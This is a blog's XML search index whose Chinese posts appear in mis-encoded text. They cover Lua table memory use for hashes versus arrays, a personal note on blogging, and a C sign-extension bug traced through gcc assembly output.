<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>å¯¹æ¯” lua table ä¸­å“ˆå¸Œè¡¨å’Œæ•°ç»„çš„å†…å­˜å ç”¨</title>
    <url>/2021/12/18/%E5%AF%B9%E6%AF%94-lua-table-%E4%B8%AD%E5%93%88%E5%B8%8C%E8%A1%A8%E5%92%8C%E6%95%B0%E7%BB%84%E7%9A%84%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8/</url>
    <content><![CDATA[<p>lua æŠŠæ•°ç»„å’Œå“ˆå¸Œè¡¨ç³…åˆè¿›äº†åŒä¸€ä¸ªæ•°æ®ç»“æ„ table é‡Œï¼Œå¯ä»¥ç†è§£è¿™æ ·è®¾è®¡çš„æœ¬æ„æ˜¯è®©è¿™é—¨è¯­è¨€å°½é‡ç®€å•ã€‚åœ¨ä¸€äº›æ—¢å¯ä»¥ç”¨æ•°ç»„ä¹Ÿå¯ä»¥ä½¿ç”¨å“ˆå¸Œè¡¨çš„åœºåˆï¼Œç”±äºå“ˆå¸Œè¡¨ç›´æ¥æ˜äº†å¼€å‘äººå‘˜å¾€å¾€å°†æ•°ç»„å¼ƒä¹‹ä¸ç”¨ï¼Œç„¶è€Œäº‹å®ä¸Š lua åº•å±‚è¿˜æ˜¯æŠŠè¿™ä¸¤ç§æ•°æ®ç»“æ„åˆ†å¼€å®ç°çš„ï¼Œå“ˆå¸Œè¡¨çš„å†…å­˜å ç”¨é€šå¸¸ä¼šæ¯”æ•°ç»„é«˜ã€‚ä¸‹é¢åœ¨ 64 ä½ Linux ä¸‹ <code>lua 5.3.0</code> ä¸ºä¾‹åˆ†æäºŒè€…å†…å­˜å ç”¨çš„ä¸åŒä¹‹å¤„ã€‚</p>
<h2 id="lua-table"><a href="#lua-table" class="headerlink" title="lua table"></a>lua table</h2><p>Table ç»“æ„ä½“å®šä¹‰åœ¨ <code>lobject.h</code> æ–‡ä»¶é‡Œã€‚å…¶ä¸­ä¸æ•°ç»„ç›¸å…³çš„æˆå‘˜ <code>array</code> æŒ‡å‘ä¸€ä¸ª <code>TValue</code> æ•°ç»„ï¼Œ<code>sizearray</code> ä¿å­˜è¿™ä¸ª Tvalue æ•°ç»„çš„å®¹é‡ã€‚è€Œä¸å“ˆå¸Œè¡¨ç›¸å…³çš„æˆå‘˜ <code>node</code> ä¸ <code>lastfree</code> åˆ†åˆ«æŒ‡å‘ <code>Node</code> æ•°ç»„åŠè¯¥æ•°ç»„çš„æœ«èŠ‚ç‚¹ï¼Œ<code>lsizenode</code> ä»¥ log<sub>2</sub> çš„å½¢å¼ä¿å­˜ Node æ•°ç»„çš„å®¹é‡ï¼Œå³ log<sub>2</sub>size = lsizenodeï¼Œlsizenode åˆå§‹å€¼æ˜¯ 0ï¼Œè¿™æ„å‘³ç€æ— è®ºå¦‚ä½• <code>Node</code> æ•°ç»„è‡³å°‘æœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåœ¨æºç é‡Œè¿™ä¸ªèŠ‚ç‚¹è¡¨ç°ä¸º <code>dummynode_</code>ï¼Œæ­¤å¤„ä¸å±•å¼€ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Table</span> &#123;</span></span><br><span class="line">  CommonHeader;</span><br><span class="line">  lu_byte flags;  <span class="comment">/* 1&lt;&lt;p means tagmethod(p) is not present */</span></span><br><span class="line">  lu_byte lsizenode;  <span class="comment">/* log2 of size of &#x27;node&#x27; array */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> sizearray;  <span class="comment">/* size of &#x27;array&#x27; array */</span></span><br><span class="line">  TValue *<span class="built_in">array</span>;  <span class="comment">/* array part */</span></span><br><span class="line">  Node *node;</span><br><span class="line">  Node *lastfree;  <span class="comment">/* any free position is before this position */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Table</span> *<span class="title">metatable</span>;</span></span><br><span class="line">  GCObject *gclist;</span><br><span class="line">&#125; Table;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2021/12/13/X5bmKpu12ELwzfe.jpg" alt="åˆå§‹åŒ– lua table.jpg"></p>
<h2 id="å¯¹æ¯”å†…å­˜å ç”¨"><a href="#å¯¹æ¯”å†…å­˜å ç”¨" class="headerlink" title="å¯¹æ¯”å†…å­˜å ç”¨"></a>å¯¹æ¯”å†…å­˜å ç”¨</h2><p>ä»¥å¦‚ä¸‹ä»£ç ä¸ºä¾‹ï¼Œå¯ä»¥çœ‹åˆ°åˆ›å»º 100 ä¸ªå¤§å°ä¸º 100 çš„å“ˆå¸Œè¡¨ä½¿ç”¨çš„å†…å­˜ä¸º 421348.0 byteï¼Œè€Œåˆ›å»º 100 ä¸ªé•¿åº¦ä¸º 100 çš„æ•°ç»„ä½¿ç”¨çš„å†…å­˜ä¸º 210400.0 byteï¼ŒäºŒè€…æ¯”å€¼çº¦ä¸º 2.0ã€‚è€Œä¸€ä¸ª Node å’Œä¸€ä¸ª TValue å†…å­˜å ç”¨ä¹‹æ¯”ä¹Ÿæ˜¯ 2.0ï¼š</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">getMem</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">collectgarbage</span>(<span class="string">&quot;count&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">collectgarbage</span>(<span class="string">&quot;stop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»º 100 ä¸ªå¤§å°ä¸º 100 çš„å“ˆå¸Œè¡¨</span></span><br><span class="line">before_mem = getMem()</span><br><span class="line"><span class="keyword">for</span> j = <span class="number">1</span>, <span class="number">100</span>, <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">local</span> tab = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, <span class="number">100</span>, <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> s = <span class="built_in">tostring</span>(i)</span><br><span class="line">        tab[s] = i</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hash:&quot;</span>, (getMem() - before_mem)* <span class="number">1024</span>, <span class="string">&quot;byte&quot;</span>)  <span class="comment">-- hash: 421348.0 byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»º 100 ä¸ªé•¿åº¦ä¸º 100 çš„æ•°ç»„</span></span><br><span class="line">before_mem = getMem()</span><br><span class="line"><span class="keyword">for</span> j = <span class="number">1</span>, <span class="number">100</span>, <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">local</span> arr = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, <span class="number">100</span>, <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        arr[i] = i</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;array:&quot;</span>, (getMem() - before_mem) * <span class="number">1024</span>, <span class="string">&quot;byte&quot;</span>)  <span class="comment">-- array: 210400.0 byte</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å¯¹æ¯”ä¸€ä¸ª Node å’Œä¸€ä¸ª TValue å ç”¨çš„å†…å­˜</span></span><br><span class="line"><span class="keyword">local</span> tab_2 = &#123;&#125;</span><br><span class="line"><span class="keyword">local</span> total_mem = <span class="number">0</span></span><br><span class="line"><span class="keyword">local</span> before_mem = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">local</span> s = <span class="built_in">tostring</span>(i)</span><br><span class="line">    before_mem = getMem()</span><br><span class="line">    tab_2[s] = i</span><br><span class="line">    total_mem = total_mem + ((getMem() - before_mem) * <span class="number">1024</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Node:&quot;</span>, total_mem, <span class="string">&quot;byte&quot;</span>)  <span class="comment">-- Node: 32.0 byte</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> arr_2 = &#123;&#125;</span><br><span class="line"><span class="keyword">local</span> total_mem = <span class="number">0</span></span><br><span class="line"><span class="keyword">local</span> before_mem = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">    before_mem = getMem()</span><br><span class="line">    arr_2[i] = i</span><br><span class="line">    total_mem = total_mem + ((getMem() - before_mem) * <span class="number">1024</span>) </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;TValue:&quot;</span>, total_mem, <span class="string">&quot;byte&quot;</span>)  <span class="comment">-- Tvalue: 16.0 byte</span></span><br></pre></td></tr></table></figure>

<p><strong>ç»“è®ºï¼šç†æƒ³æƒ…å†µä¸‹ï¼Œå“ˆå¸Œè¡¨å†…å­˜å ç”¨çº¦ä¸ºæ•°ç»„çš„ä¸¤å€ã€‚</strong></p>
<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å…ˆæ¥çœ‹æ•°ç»„ç›¸å…³çš„ TValue éƒ¨åˆ†ï¼Œå¦‚æ³¨é‡Šæ‰€è¨€ lua é‡Œæ‰€æœ‰å€¼éƒ½è¡¨ç¤ºä¸ºä¸€ä¸ª Value è”åˆä½“ + ç±»å‹æ ‡ç­¾ï¼Œå³ <code>TValuefields</code>ã€‚ç»“æ„ä½“ <code>lua_TValue</code> çš„å”¯ä¸€æˆå‘˜å³ä¸º TValuefieldsï¼Œè€Œ Tvalue åˆ™æ˜¯ lua_TValue çš„åˆ«å:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">lua_TValue</span> <span class="title">TValue</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lua_TValue</span> &#123;</span></span><br><span class="line">  TValuefields;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** Tagged Values. This is the basic representation of values in Lua,</span></span><br><span class="line"><span class="comment">** an actual value plus a tag with its type.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TValuefields	Value value_; int tt_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** Union of all Lua values</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">Value</span> <span class="title">Value</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">Value</span> &#123;</span></span><br><span class="line">  GCObject *gc;    <span class="comment">/* collectable objects */</span></span><br><span class="line">  <span class="keyword">void</span> *p;         <span class="comment">/* light userdata */</span></span><br><span class="line">  <span class="keyword">int</span> b;           <span class="comment">/* booleans */</span></span><br><span class="line">  lua_CFunction f; <span class="comment">/* light C functions */</span></span><br><span class="line">  lua_Integer i;   <span class="comment">/* integer numbers */</span></span><br><span class="line">  lua_Number n;    <span class="comment">/* float numbers */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è”åˆä½“é•¿åº¦ä¸å…¶æœ€å¤§æˆå‘˜ä¸€è‡´ï¼Œå¯çŸ¥ Value é•¿åº¦ä¸º 8 bytesï¼Œé‚£ä¹ˆ TValuefields å¤§å°å³ä¸º 8 + 4 = 12 bytesï¼Œå†è€ƒè™‘æ“ä½œç³»ç»Ÿçš„å­—èŠ‚å¯¹é½ä¸€ä¸ª TValuefields å®é™…å†…å­˜å ç”¨ä¸º 16 bytesã€‚åˆ†æç»“æœä¸ä»£ç å±•ç¤ºä¸€è‡´ã€‚</p>
<p>å†çœ‹å“ˆå¸Œè¡¨ç›¸å…³çš„ Node éƒ¨åˆ†ï¼ŒTValue çš„ä»£ç ä¸Šé¢å·²ç»è´´è¿‡äº†å°±ä¸å†é‡å¤ã€‚Node ç»“æ„ä½“æœ‰ä¸¤ä¸ªæˆå‘˜ i_val å’Œ i_keyï¼Œi_val å¦‚å‰æ–‡æ‰€è¨€å ç”¨ 16 bytesï¼Œi_key ä½œä¸ºè”åˆä½“é•¿åº¦ä¸ <code>nk</code> ä¸€è‡´ï¼Œå³ 16 bytesï¼Œé‚£ä¹ˆä¸€ä¸ª Node å†…å­˜å ç”¨ 16 + 16 = 32 bytesï¼Œä¹Ÿä¸ä»£ç å±•ç¤ºä¸€è‡´ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">  TValue i_val;</span><br><span class="line">  TKey i_key;</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">TKey</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    TValuefields;</span><br><span class="line">    <span class="keyword">int</span> next;  <span class="comment">/* for chaining (offset for next node) */</span></span><br><span class="line">  &#125; nk;</span><br><span class="line">  TValue tvk;</span><br><span class="line">&#125; TKey;</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è™½ç„¶å“ˆå¸Œè¡¨å’Œæ•°ç»„åœ¨ lua é‡Œéƒ½è¡¨ç¤ºä¸ºä¸€ä¸ª tableï¼Œä½†æ˜¯å…¶åº•å±‚å®ç°è¿˜æ˜¯æœ‰æ‰€åŒºåˆ«çš„ï¼Œç†æƒ³æƒ…å†µä¸‹å“ˆå¸Œè¡¨çš„å†…å­˜å ç”¨æ˜¯æ•°ç»„çš„ä¸¤å€ï¼Œä¸»è¦åŒºåˆ«åœ¨äºå“ˆå¸ŒèŠ‚ç‚¹æ¯”æ•°ç»„èŠ‚ç‚¹å¤šäº†ä¸€ä¸ª TKey çš„å†…å­˜å ç”¨ã€‚åœ¨æ•°æ®é‡å¤§çš„æƒ…å†µä¸‹è€ƒè™‘ä½¿ç”¨æ•°ç»„å¯ä»¥æœ‰æ•ˆå‡å°‘å†…å­˜å‹åŠ›ã€‚</p>
]]></content>
      <categories>
        <category>æ•°æ®ç»“æ„</category>
      </categories>
      <tags>
        <tag>lua</tag>
      </tags>
  </entry>
  <entry>
    <title>æ”¹å˜ä¸€ä¸‹æ€è·¯</title>
    <url>/2021/05/27/%E6%80%9D%E8%B7%AF%E8%BD%AC%E5%8F%98/</url>
    <content><![CDATA[<p>æœ€è¿‘åœ¨æ€è€ƒè‡ªå·±çš„åšå®¢åº”è¯¥å†™äº›ä»€ä¹ˆå†…å®¹ã€‚</p>
<span id="more"></span>

<p>å…¶å®ä¸€å¼€å§‹åªæ˜¯æŠŠåšå®¢ä½œä¸ºä¸€ä¸ªè·¨å¹³å°çš„ç¬”è®°æœ¬åœ¨ç”¨ï¼Œæ‰€ä»¥å¦‚æœå»ç¿»é˜…æ—©æœŸçš„åšæ–‡å¯ä»¥çœ‹åˆ°å¾ˆå¤šå†…å®¹éƒ½æ¯”è¾ƒæ¯ç‡¥ã€‚è‡³äºä¸ºä»€ä¹ˆä¸é€‰æ‹©<a href="https://shimo.im/desktop">çŸ³å¢¨æ–‡æ¡£</a>æˆ–è€… <a href="https://www.yinxiang.com/?referer=en">Evernote</a> è¿™æ ·çš„å¹³å°æ˜¯å› ä¸ºé‚£æ—¶å€™è§‰å¾—æœ‰ä¸ªè‡ªå·±çš„ç½‘ç«™å¾ˆ coolğŸ˜ã€‚ç„¶åä¸çŸ¥ä¸è§‰è¿™ä¸ªåšå®¢å°±è¿™æ ·è¿è¡Œäº†ä¸‰å¹´å¤šäº†ï¼Œé‡Œé¢çš„å†…å®¹ä¹Ÿä¸€ç›´ä»¥æŠ€æœ¯ä¸ºä¸»ã€‚è¯´èµ·æ¥è¿˜æœ‰ä¸ªæœ‰æ„æ€çš„äº‹ï¼Œé¢è¯•çš„æ—¶å€™é¢è¯•å®˜ç‰¹åœ°æ‰“å¼€è¿™ä¸ªåšå®¢æµè§ˆäº†ä¸€ä¸‹ï¼Œç„¶åè‚¯å®šäº†æˆ‘å†™åšå®¢è¿™ä¸ªè¡Œä¸ºï¼Œå¬ä»–æ„æ€åº”è¯¥æ˜¯æœ‰åŠ åˆ†ï¼Œç®—æ˜¯ä¸€ä¸ªæ„å¤–æ”¶è·å§ã€‚</p>
<p>è¿™å‡ å¤©é—²ç€æ²¡äº‹å¹²ç…§ä¾‹å»ç¿»ä¸€ç¿»æœ‹å‹çš„åšå®¢ï¼Œå‘ç°å¤§å®¶ä¸æ­¢ä¼šåœ¨ä¸Šé¢è®¨è®ºæŠ€æœ¯ã€‚åæ§½æ—¥å¸¸ç”Ÿæ´»ã€è®¨è®ºæ•°ç ç§‘æŠ€ã€åˆ†äº«å¯¹äº§å“çš„è®²è§£â€¦â€¦è¿™äº›å†…å®¹éƒ½å¾ˆæœ‰æ„æ€ï¼Œä¹Ÿæé†’äº†æˆ‘åšå®¢çš„æœ¬æ„æ˜¯æˆä¸ºæ¯ä¸ªäººåœ¨äº’è”ç½‘ä¸Šçš„ä¸€å¼ åç‰‡ï¼Œæˆ–è€…è¯´æ˜¯ä¸€ç§åŸå§‹çŠ¶æ€çš„â€œæœ‹å‹åœˆâ€ã€‚å¦‚æœä¸€ä¸ªäººçš„æœ‹å‹åœˆé‡Œåªæœ‰å·¥ä½œç›¸å…³çš„å†…å®¹ï¼Œé‚£æœªå…æœ‰äº›å¤ªæ— èŠäº†å§ï¼Ÿè€Œä¸”å‘å¸ƒåœ¨æœ‹å‹åœˆçš„å†…å®¹å¤§å¤šæ¯”è¾ƒç®€çŸ­ï¼Œå‡ åä¸ªå­—+ä¸¤ä¸‰å¼ å›¾ç‰‡æ‰€èƒ½æ‰¿è½½çš„ä¿¡æ¯è¿˜æ˜¯æœ‰äº›æ‰è¥Ÿè§è‚˜ã€‚ä»¥å‰å’Œç”Ÿæ´»ç›¸å…³çš„å†…å®¹å¤§å¤šåœ¨æœ‹å‹åœˆæˆ–è€…ä¸ªäººè´´å§ï¼Œä½†ç»å†äº†è´´å§å»å¹´è¿‘ä¹é‡è›®åœ°å¤§è§„æ¨¡åˆ å¸–ä¹‹åæˆ‘å¯¹è¿™äº›äº’è”ç½‘å…¬å¸çš„å¯é æ€§äº§ç”Ÿäº†æ·±æ·±åœ°æ€€ç–‘ï¼Œè°çŸ¥é“å“ªå¤©ä½ å†™çš„ä¸œè¥¿è«åå…¶å¦™å°±è¢«â€œæ¶ˆå¤±â€äº†å‘¢ï¼Ÿå¦å¤–æˆ‘ä¸ªäººæ˜¯æ¯”è¾ƒäº«å—å†™åšæ–‡çš„æ„Ÿè§‰çš„ï¼Œå¥½åƒåœ¨å’Œè‡ªå·±å¯¹è¯ï¼Œä¸€ç‚¹ç‚¹ç†æ¸…æ–‡ç« èƒŒåçš„é€»è¾‘ã€‚å½“ç„¶è¿™æ ·ä¼šèŠ±è´¹æ›´å¤šæ—¶é—´å’Œç²¾åŠ›ï¼Œä½†æˆ‘å§‹ç»ˆè§‰å¾—ä»˜å‡ºç‚¹æ—¶é—´å»åšæ€è€ƒæ€»ç»“æ˜¯æœ‰ç›Šæ— å®³çš„ã€‚æŠ€æœ¯ä»¥å¤–çš„ä¸–ç•Œä¹Ÿå¾ˆç²¾å½©ï¼ŒåŒæ ·å€¼å¾—è®°å½•ã€‚</p>
<p>å¦‚ä½•æé«˜åšæ–‡çš„è´¨é‡ä¹Ÿæ˜¯ä¸ªé—®é¢˜ã€‚å¹³å¿ƒè€Œè®ºä¹‹å‰çš„åšæ–‡å¤§å¤šæ˜¯è‡ªå·±çœ‹å®Œä¸€æœ¬ä¹¦æˆ–è€…å‡ ç¯‡æ–‡ç« åçš„é˜…è¯»ç¬”è®°ã€‚ä½†æœ€è¿‘æˆ‘å¼€å§‹å°è¯•ä»¥è‡ªæˆ‘ä¸ºä¸­å¿ƒè¿›è¡Œå†™ä½œï¼Œä¸æ˜¯å•çº¯åœ°æ€»ç»“åˆ«äººçš„å·¥ä½œï¼Œè€Œæ˜¯è‡ªå·±å»å®è·µæå‡ºé—®é¢˜â€”&gt;æŸ¥é˜…èµ„æ–™-&gt;åŠ¨æ‰‹éªŒè¯-&gt;æ•´ç†æˆæ–‡è¿™ä¸ªè¿‡ç¨‹ã€‚äºŒè€…ä¸»è¦çš„åŒºåˆ«åœ¨äºä¸€ç¯‡æ–‡ç« çš„ idea æ˜¯è‡ªå·±æå‡ºæ¥çš„ï¼Œå°½ç®¡å†…å®¹ä¸å¯é¿å…åœ°éœ€è¦å‚è€ƒåˆ«äººçš„ä¸œè¥¿ï¼Œä½†æ€»ä½“æ€è·¯æ˜¯è‡ªå·±çš„ã€‚</p>
<p>åšå®¢çš„æ›´æ–°é¢‘ç‡ä¹Ÿå¯ä»¥ä½œä¸ºè¿‘æœŸå­¦ä¹ è´¨é‡çš„è¯„ä»·æ ‡å‡†ä¹‹ä¸€ï¼Œæ²¡æœ‰è¾“å…¥å°±æ— ä»è¾“å‡ºã€‚å¸Œæœ›è‡ªå·±ä¸è¦å¤ªæ‡’ğŸ˜­ã€‚</p>
<p><img src="https://i.loli.net/2021/05/27/5NBPl6pCstxI9AF.png" alt="E7LZ713R__82T@AY_RERCY8.png"></p>
]]></content>
      <categories>
        <category>æ—¥å¸¸</category>
      </categories>
      <tags>
        <tag>é—²èŠ</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡æº¢å‡ºé”™è¯¯</title>
    <url>/2021/05/26/%E7%BB%86%E5%BF%83%E5%BE%88%E9%87%8D%E8%A6%81%E2%80%94%E2%80%94%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BA%A2%E5%87%BA%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<p>ä¹ æƒ¯äº†å¼±ç±»å‹è¯­è¨€å†å›åˆ° C è¿™ç±»å¼ºç±»å‹è¯­è¨€çš„ç»“æœæ˜¯ï¼Œåœ¨å„ç§ç±»å‹è½¬æ¢ä¹‹é—´æ™•å¤´è½¬å‘ã€‚</p>
<span id="more"></span>

<p>ä»Šå¤©åœ¨ç”¨ C å†™<a href="https://github.com/yue-qiu/memoryPool">å†…å­˜æ± </a>çš„æ—¶å€™ï¼Œé‡åˆ°äº†ä¸€ä¸ªè›®æœ‰æ„æ€çš„éšå¼ç±»å‹è½¬æ¢é”™è¯¯ï¼Œç‰¹åœ°è®°å½•ä¸€ä¸‹ã€‚</p>
<p>å…ˆå†™ä¸€ä¸ª test1.cï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 2097150</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1025</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> c = a * b; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c in test1: %lu\n&quot;</span>, c); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†çœ‹ test2.cï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 2097150</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> b = <span class="number">1025</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> c = a * b; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c in test2: %lu\n&quot;</span>, c); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸¤æ®µä»£ç å˜é‡ b çš„æ•°æ®ç±»å‹ä¸åŒï¼Œè¾“å‡ºè¯•è¯•ï¼š</p>
<p><img src="https://i.loli.net/2021/05/26/Fx6odkEagmhtu28.png" alt="image.png"></p>
<p>Oopsï¼Œçœ‹æ¥å‡ºäº†ç‚¹æ„å¤–ã€‚<code>test2</code> äº§ç”Ÿäº†æˆ‘çš„é¢„æœŸå€¼ï¼Œè€Œ <code>test1</code> ä¼¼ä¹æ˜¯å‘ç”Ÿäº†æº¢å‡ºã€‚ä½† 1025 * 2097150 çš„ç»“æœæ˜¯å°äº unsigned long çš„æœ€å¤§å€¼çš„ï¼Œé‚£ææ€•ä¸æ˜¯æº¢å‡ºé‚£ä¹ˆç®€å•äº†ã€‚è®©æˆ‘ä»¬ä»æ±‡ç¼–çš„è§’åº¦çœ‹çœ‹åº•å±‚åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p>
<p>å¾—åˆ°ä¸¤æ®µä»£ç çš„æ±‡ç¼–æ–‡ä»¶å¹¶ç”¨ vim å¯¹æ¯”ä¸¤è€…çš„ä¸åŒä¹‹å¤„ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -S test1.c -o test1.s</span><br><span class="line">gcc -S test2.c -o test2.s</span><br><span class="line">vim -d test1.s test2.s </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ±‡ç¼–ä»£ç çš„ä¸»è¦å·®åˆ«åœ¨ç¬¬ 22 è¡Œï¼Œtest1.s ä½¿ç”¨äº† <code>cltq</code> æŒ‡ä»¤ï¼š</p>
<p><img src="https://i.loli.net/2021/05/26/XNZdVvk53BqjPyY.png" alt="image.png"></p>
<p>æŸ¥é˜…èµ„æ–™å‘ç° <code>cltq</code> æ˜¯è¿™ä¸ªæ„æ€ï¼š</p>
<blockquote>
<p>cltq R[%rax ] &lt;- SignExtend(R[%eax]) Convert %eax to quad word</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´ <code>cltq</code> ä¼šæŠŠ <code>%eax</code> çš„å€¼<strong>å¸¦ç¬¦å·åœ°</strong>æ‰©å±•åˆ° <code>%rax</code>ã€‚è€Œ 1025 * 2097150 çš„ç»“æœåœ¨ <code>%eax</code> æœ€é«˜ä½çš„å–å€¼æ˜¯ 1ï¼Œæ‰©å±•ä¹‹åè‡ªç„¶çœ‹èµ·æ¥å°±åƒæº¢å‡ºäº†ä¸€æ ·ã€‚</p>
<p>ä¹‹æ‰€ä»¥äº§ç”Ÿè¿™ä¸ªé”™è¯¯ï¼Œæ˜¯å› ä¸ºä¸€ä¸ª 32 ä½æœ‰ç¬¦å·çš„å³å€¼è¢«èµ‹ç»™äº† 64 ä½æ— ç¬¦å·å·¦å€¼ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­å‘ç”Ÿçš„éšå¼ç±»å‹è½¬æ¢ç”±ä¸€æ¡ <code>ctql</code> æŒ‡ä»¤æ¥å®Œæˆã€‚ä½¿ç”¨å¼ºç±»å‹è¯­è¨€è¿›è¡Œç¼–ç çš„æ—¶å€™è¦éå¸¸è°¨æ…åœ°åœ¨ä¸åŒæ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚</p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>ç¼–ç </tag>
      </tags>
  </entry>
  <entry>
    <title>æ—¶é—´è½®ä¸æ—¶é—´å †</title>
    <url>/2021/05/19/%E6%97%B6%E9%97%B4%E8%BD%AE%E4%B8%8E%E6%97%B6%E9%97%B4%E5%A0%86/</url>
